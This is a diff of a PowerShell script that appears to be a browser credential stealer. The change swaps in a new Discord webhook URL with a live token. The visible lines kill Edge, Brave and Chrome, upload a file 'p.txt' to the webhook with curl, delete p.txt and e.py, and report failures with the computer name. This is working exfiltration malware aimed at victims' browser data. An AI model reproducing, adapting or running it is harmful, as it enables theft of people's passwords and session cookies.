@@ -1,4 +1,4 @@
-$wh="https://discord.com/api/webhooks/1467523812563357737/NtrM4DGzR7UGo0mOZ4i2-Y65OzXuto6PCbm-T8K67_JoFGV_rElaAwtptxjQJbPGH5i6"
+$wh="https://discord.com/api/webhooks/1467595354605359156/eHoQQnGhIXQeeWyudwee1bq7bYY48wxjeWfPejB4IbpO4kr_sQ1yrlT825ieKT7ckvwZ"
 taskkill /F /IM msedge.exe,brave.exe,chrome.exe 2>$null
 Start-Sleep 2
 try{
@@ -93,3 +93,4 @@ if($r -eq "OK"){curl.exe -F "file=@p.txt" $wh 2>$null;Remove-Item p.txt,e.py -Fo
 cd $env:TEMP
 # Ne pas supprimer Python pour réutilisation future
 }catch{curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"Failed on $env:COMPUTERNAME`"}" $wh}
+
